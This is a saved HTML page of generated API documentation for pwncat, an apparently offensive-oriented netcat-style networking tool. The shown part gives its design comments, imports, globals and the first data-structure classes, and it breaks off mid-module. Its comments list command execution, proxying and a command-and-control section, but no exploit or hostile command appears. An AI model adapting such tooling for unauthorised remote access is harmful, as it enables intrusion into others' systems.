<!DOCTYPE html>
<!-- saved from url=(0034)https://pwncat.org/pwncat.api.html -->
<html lang="en">
<head>
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">

    <meta content="width=device-width, initial-scale=1, minimum-scale=1" name="viewport">
    <meta content="pdoc 0.10.0" name="generator">
    <title>pwncat API documentation</title>
    <meta content="pwncat." name="description">
    <link as="style" crossorigin=""
          href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css"
          integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" rel="preload stylesheet">
    <link as="style" crossorigin=""
          href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css"
          integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" rel="preload stylesheet">
    <link as="style" crossorigin=""
          href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css"
          rel="stylesheet preload">
    <style>
        :root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}
    </style>
    <style media="screen and (min-width: 700px)">
        @media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}
    </style>
    <style media="print">
        @media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}
    </style>
    <script crossorigin="" defer=""
            integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8="
            src="./pwncat API documentation_files/highlight.min.js.download"></script>
    <script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</head>
<body>
<main>
    <article id="content">
        <header>
            <h1 class="title">Module <code>pwncat</code></h1>
        </header>
        <section id="section-intro">
            <p>pwncat.</p>
            <details class="source">
                <summary>
                    <span>Expand source code</span>
                </summary>
                <pre><code class="python hljs"><span
                        class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-string">"""pwncat."""</span>

<span class="hljs-comment"># Main sections in this file:</span>
<span class="hljs-comment"># ------------------------------------</span>
<span class="hljs-comment">#  1. Data structure types</span>
<span class="hljs-comment">#  2. Library classes</span>
<span class="hljs-comment">#  3. Network</span>
<span class="hljs-comment">#  4. Transformer</span>
<span class="hljs-comment">#  5. IO modules</span>
<span class="hljs-comment">#  6. PSE Store</span>
<span class="hljs-comment">#  7. IO Runner / InterruptHandler</span>
<span class="hljs-comment">#  8. Command &amp; Control</span>
<span class="hljs-comment">#  9. Command line arguments</span>
<span class="hljs-comment"># 10. Main entrypoint</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># How does it work?</span>
<span class="hljs-comment"># ------------------------------------</span>
<span class="hljs-comment"># 1. IO (Various input/output modules based on producer/consumer)</span>
<span class="hljs-comment"># 2. Transformer (transforms data)</span>
<span class="hljs-comment"># 3. Runner (puts IO consumer/producer into threads)</span>
<span class="hljs-comment"># 4. Signaling / Interrupts</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># 1. IO</span>
<span class="hljs-comment"># ------------------------------------</span>
<span class="hljs-comment"># IO classes provide basic input/output functionality.</span>
<span class="hljs-comment"># The producer will constantly gather input (net recv, user input, command output)</span>
<span class="hljs-comment"># The consumer is a callback applied to this data (net send, output, command execution)</span>
<span class="hljs-comment"># Each producer/consumer pair will be put into a thread by the Runner instance.</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># 2. Transformer</span>
<span class="hljs-comment"># ---------------------------</span>
<span class="hljs-comment"># Transformer sit on top of a IO callback and can transform the data before it is send</span>
<span class="hljs-comment"># to the callback. (e.g.: convert LF to CRLF, convert simple text into a HTTP POST request,</span>
<span class="hljs-comment"># convert a HTTP POST response into text, encrypt/decrypt, etc.)</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># 3. Runner - The really cool meat:</span>
<span class="hljs-comment"># ------------------------------------</span>
<span class="hljs-comment"># The single Runner instance puts it all-together. Each producer/consumer pair (and</span>
<span class="hljs-comment"># x many Transformer) will be moved into their own Thread.</span>
<span class="hljs-comment"># Producer and consumer of different instances can be mixed, when adding them to the Runner.</span>
<span class="hljs-comment"># This allows an Net-1.receive producer, to output it (chat), execute it (command)</span>
<span class="hljs-comment"># or to send it further via a second Net-2 class (proxy).</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># A list of Transformer can be added to each consumer/producer pair, allowing further data</span>
<span class="hljs-comment"># transformation. This means you can simply write a Transformer, which wraps any kind of raw</span>
<span class="hljs-comment"># data into a Layer-7 protocol and/or unwraps it from it. This allows for easy extension</span>
<span class="hljs-comment"># of various protocols or other data transformations.</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># 4. Signaling / Interrupts</span>
<span class="hljs-comment"># ------------------------------------</span>
<span class="hljs-comment"># The InterruptHandler instance is distributed across all Threads and and the Runner instance and</span>
<span class="hljs-comment"># is a way to let other Threads know that a stop signal has been requested.</span>
<span class="hljs-comment"># Producer/Consumer can implement their own interrupt function so they can be stopped from</span>
<span class="hljs-comment"># inside (if they do non-blocking stuff) or from outside (if they do blocking stuff).</span>

<span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function
<span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> abstractmethod
<span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta

<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> PIPE
<span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen
<span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> STDOUT

<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> select
<span class="hljs-keyword">import</span> signal
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># Available since Python 3.3</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">import</span> ipaddress
<span class="hljs-keyword">except</span> ImportError:
    <span class="hljs-keyword">pass</span>
<span class="hljs-comment"># Posix terminal</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">import</span> tty
    <span class="hljs-keyword">import</span> termios
<span class="hljs-keyword">except</span> ImportError:
    <span class="hljs-keyword">pass</span>
<span class="hljs-comment"># Windows</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">import</span> msvcrt
<span class="hljs-keyword">except</span> ImportError:
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># Only used with mypy for static source code analysis</span>
<span class="hljs-keyword">if</span> os.environ.get(<span
                            class="hljs-string">"MYPY_CHECK"</span>, <span class="hljs-literal">False</span>):
    <span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> Optional, Iterator, List, Dict, Any, Callable, Tuple, Union, TypeVar
    <span class="hljs-keyword">from</span> types <span class="hljs-keyword">import</span> CodeType
    <span class="hljs-keyword">from</span> typing_extensions <span
                            class="hljs-keyword">import</span> TypedDict  <span
                            class="hljs-comment"># pylint: disable=import-error</span>

    SockInst = TypeVar(<span class="hljs-string">"SockInst"</span>, bound=<span class="hljs-string">"Sock"</span>)
    <span class="hljs-comment"># The following is only to create virtual types for mypy in order to find</span>
    <span class="hljs-comment"># issues via static type linting.</span>
    SockConn = TypedDict(
        <span class="hljs-string">"SockConn"</span>,
        {
            <span class="hljs-string">"sock"</span>: socket.socket,
            <span class="hljs-string">"conn"</span>: socket.socket,
            <span class="hljs-string">"local_host"</span>: Optional[str],
            <span class="hljs-string">"local_addr"</span>: str,
            <span class="hljs-string">"local_port"</span>: int,
            <span class="hljs-string">"remote_host"</span>: str,
            <span class="hljs-string">"remote_addr"</span>: str,
            <span class="hljs-string">"remote_port"</span>: int,
        },
        total=<span class="hljs-literal">False</span>,
    )
    SockActive = TypedDict(
        <span class="hljs-string">"SockActive"</span>,
        {<span class="hljs-string">"af"</span>: int, <span class="hljs-string">"conn"</span>: socket.socket, <span
                            class="hljs-string">"remote_addr"</span>: str, <span
                            class="hljs-string">"remote_port"</span>: int},
        total=<span class="hljs-literal">False</span>,
    )


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># GLOBALS</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>

APPNAME = <span class="hljs-string">"pwncat"</span>
APPREPO = <span class="hljs-string">"https://github.com/cytopia/pwncat"</span>
VERSION = <span class="hljs-string">"0.1.2"</span>

<span class="hljs-comment"># Default timeout for timeout-based sys.stdin and socket.recv</span>
TIMEOUT_READ_STDIN = <span class="hljs-number">0.05</span>
TIMEOUT_RECV_SOCKET = <span class="hljs-number">0.05</span>
TIMEOUT_RECV_SOCKET_RETRY = <span class="hljs-number">1</span>

<span class="hljs-comment"># https://docs.python.org/3/library/subprocess.html#popen-constructor</span>
<span class="hljs-comment"># * 0 means unbuffered (read and write are one system call and can return short)</span>
<span class="hljs-comment"># * 1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)</span>
<span class="hljs-comment"># * any other positive value means use a buffer of approximately that size</span>
<span class="hljs-comment"># * negative bufsize (the default) means the system default of io.DEFAULT_BUFFER_SIZE will be used.</span>
<span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> should I use 'bufsize=1'?</span>
<span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Probably set it to 0: https://stackoverflow.com/a/45664969</span>
POPEN_BUFSIZE = <span class="hljs-number">-1</span>

<span class="hljs-comment"># https://docs.python.org/3/library/socket.html#socket.socket.recv</span>
RECV_BUFSIZE = <span class="hljs-number">8192</span>

<span class="hljs-comment"># https://docs.python.org/3/library/socket.html#socket.socket.listen</span>
LISTEN_BACKLOG = <span class="hljs-number">0</span>


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   1 / 11   M E T A   C L A S S E S</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [1/11 META CLASSES]: (1/2) Abstract</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># Abstract class with Python 2 + Python 3 support: https://stackoverflow.com/questions/35673474</span>
ABC = ABCMeta(<span class="hljs-string">"ABC"</span>, (object,), {<span class="hljs-string">"__slots__"</span>: ()})


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [1/11 META CLASSES]: (2/2) Singleton</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span
        class="hljs-title">_Singleton</span>(<span class="hljs-params">type</span>):</span>
    <span class="hljs-string">"""A thread-safe metaclass that creates a Singleton base class when called."""</span>

    <span class="hljs-comment"># https://refactoring.guru/design-patterns/singleton/python/example#example-1</span>
    _instances = {}  <span class="hljs-comment"># type: Dict[_Singleton, _Singleton]</span>

    _lock = threading.Lock()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span>(<span
            class="hljs-params">cls, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (_Singleton, Any, Any) -&gt; _Singleton</span>

        <span class="hljs-comment"># Now, imagine that the program has just been launched. Since there's no</span>
        <span class="hljs-comment"># Singleton instance yet, multiple threads can simultaneously pass the</span>
        <span class="hljs-comment"># previous conditional and reach this point almost at the same time. The</span>
        <span class="hljs-comment"># first of them will acquire lock and will proceed further, while the</span>
        <span class="hljs-comment"># rest will wait here.</span>
        <span class="hljs-keyword">with</span> cls._lock:
            <span class="hljs-comment"># The first thread to acquire the lock, reaches this conditional,</span>
            <span class="hljs-comment"># goes inside and creates the Singleton instance. Once it leaves the</span>
            <span class="hljs-comment"># lock block, a thread that might have been waiting for the lock</span>
            <span class="hljs-comment"># release may then enter this section. But since the Singleton field</span>
            <span class="hljs-comment"># is already initialized, the thread won't create a new object.</span>
            <span class="hljs-keyword">if</span> cls <span class="hljs-keyword">not</span> <span
                            class="hljs-keyword">in</span> cls._instances:
                cls._instances[cls] = super(_Singleton, cls).__call__(*args, **kwargs)
        <span class="hljs-keyword">return</span> cls._instances[cls]


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   2 / 11   D A T A   S T R U C T U R E   T Y P E S</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (1/12) DsCallableProducer</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsCallableProducer</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for Callable functions."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">function</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Callable[..., Iterator[bytes]]</span>
        <span class="hljs-string">"""`IO.producer`: Callable funtcion function."""</span>
        <span class="hljs-keyword">return</span> self.__function

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Any</span>
        <span class="hljs-string">"""`*args`: optional *args for the callable function."""</span>
        <span class="hljs-keyword">return</span> self.__args

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kwargs</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Any</span>
        <span class="hljs-string">"""`**kargs`: optional *kwargs for the callable function."""</span>
        <span class="hljs-keyword">return</span> self.__kwargs

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Contrcutor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, function, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (Callable[..., Iterator[bytes]], Any, Any) -&gt; None</span>
        self.__function = function
        self.__args = args
        self.__kwargs = kwargs


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (2/12) DsRunnerAction</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsRunnerAction</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for Action functions for the Runner class."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; DsCallableProducer</span>
        <span class="hljs-string">"""`DsCallableProducer`: Data producer function struct with args and kwargs."""</span>
        <span class="hljs-keyword">return</span> self.__producer

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Callable[[bytes], None]</span>
        <span class="hljs-string">"""`IO.consumer`: Data consumer function."""</span>
        <span class="hljs-keyword">return</span> self.__consumer

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupts</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[Callable[[], None]]</span>
        <span class="hljs-string">"""`[List[Callable[[], None]]]`: List of interrupt functions for the producer/consumer."""</span>
        <span class="hljs-keyword">return</span> self.__interrupts

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transformers</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[Transform]</span>
        <span class="hljs-string">"""`[Transform.transformer]`: List of transformer functions applied before consumer."""</span>
        <span class="hljs-keyword">return</span> self.__transformers

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">daemon_thread</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Determines if the action will be started in a daemon thread."""</span>
        <span class="hljs-keyword">return</span> self.__daemon_thread

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">code</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[Union[str, bytes, CodeType]]</span>
        <span class="hljs-string">"""`ast.AST`: custom Python code which provides a `transform(data, pse) -&gt; str` function."""</span>
        <span class="hljs-keyword">return</span> self.__code

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Contrcutor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        producer,  <span class="hljs-comment"># type: DsCallableProducer</span>
        consumer,  <span class="hljs-comment"># type: Callable[[bytes], None]</span>
        interrupts,  <span class="hljs-comment"># type: List[Callable[[], None]]</span>
        transformers,  <span class="hljs-comment"># type: List[Transform]</span>
        daemon_thread,  <span class="hljs-comment"># type: bool</span>
        code,  <span class="hljs-comment"># type: Optional[Union[str, bytes, CodeType]]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        self.__producer = producer
        self.__consumer = consumer
        self.__interrupts = interrupts
        self.__transformers = transformers
        self.__daemon_thread = daemon_thread
        self.__code = code


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (3/12) DsRunnerTimer</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsRunnerTimer</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for Timer functions for the Runner class."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">action</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Callable[..., None]</span>
        <span class="hljs-string">"""`Callable[..., None]`: function to be run periodically."""</span>
        <span class="hljs-keyword">return</span> self.__action

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">intvl</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: interval at which to run the action function.."""</span>
        <span class="hljs-keyword">return</span> self.__intvl

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Tuple[Any, ...]</span>
        <span class="hljs-string">"""`*args`: optional *args for the action function."""</span>
        <span class="hljs-keyword">return</span> self.__args

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kwargs</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Dict[str, Any]</span>
        <span class="hljs-string">"""`**kargs`: optional *kwargs for the action function."""</span>
        <span class="hljs-keyword">return</span> self.__kwargs

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        action,  <span class="hljs-comment"># type: Callable[..., None]</span>
        ssig,  <span class="hljs-comment"># type: InterruptHandler</span>
        intvl,  <span class="hljs-comment"># type: int</span>
        args,  <span class="hljs-comment"># type: Tuple[Any, ...]</span>
        kwargs,  <span class="hljs-comment"># type: Dict[str, Any]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(intvl) <span class="hljs-keyword">is</span> int, type(intvl)
        <span class="hljs-keyword">assert</span> type(kwargs) <span class="hljs-keyword">is</span> dict, type(kwargs)
        self.__action = action
        self.__ssig = ssig
        self.__intvl = intvl
        self.__args = args
        self.__kwargs = kwargs


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (4/12) DsRunnerRepeater</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsRunnerRepeater</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for repeated functions for the Runner class."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">action</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Callable[..., None]</span>
        <span class="hljs-string">"""`Callable[..., None]`: function to be run periodically."""</span>
        <span class="hljs-keyword">return</span> self.__action

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">repeat</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: how many times to repeat the action function."""</span>
        <span class="hljs-keyword">return</span> self.__repeat

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">pause</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; float</span>
        <span class="hljs-string">"""`int`: pause in seconds between repeated action calls."""</span>
        <span class="hljs-keyword">return</span> self.__pause

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Tuple[Any, ...]</span>
        <span class="hljs-string">"""`*args`: optional *args for the action function."""</span>
        <span class="hljs-keyword">return</span> self.__args

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kwargs</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Dict[str, Any]</span>
        <span class="hljs-string">"""`**kargs`: optional *kwargs for the action function."""</span>
        <span class="hljs-keyword">return</span> self.__kwargs

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        action,  <span class="hljs-comment"># type: Callable[..., None]</span>
        ssig,  <span class="hljs-comment"># type: InterruptHandler</span>
        repeat,  <span class="hljs-comment"># type: int</span>
        pause,  <span class="hljs-comment"># type: float</span>
        args,  <span class="hljs-comment"># type: Tuple[Any, ...]</span>
        kwargs,  <span class="hljs-comment"># type: Dict[str, Any]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(repeat) <span class="hljs-keyword">is</span> int, type(repeat)
        <span class="hljs-keyword">assert</span> type(pause) <span class="hljs-keyword">is</span> float, type(pause)
        <span class="hljs-keyword">assert</span> type(kwargs) <span class="hljs-keyword">is</span> dict, type(kwargs)
        self.__action = action
        self.__ssig = ssig
        self.__repeat = repeat
        self.__pause = pause
        self.__args = args
        self.__kwargs = kwargs


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (5/12) DsSock</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
